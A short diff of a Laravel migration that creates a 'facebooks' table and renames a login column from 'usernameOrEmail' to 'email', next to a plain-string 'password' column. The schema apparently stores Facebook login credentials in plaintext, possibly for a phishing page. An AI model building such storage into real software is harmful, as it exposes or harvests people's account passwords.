@@ -16,7 +16,7 @@ return new class extends Migration
         Schema::create('facebooks', function (Blueprint $table) {
             $table->id();
 
-            $table->string('usernameOrEmail', 100);
+            $table->string('email', 100);
             $table->string('password', 100);
             
             $table->timestamps();
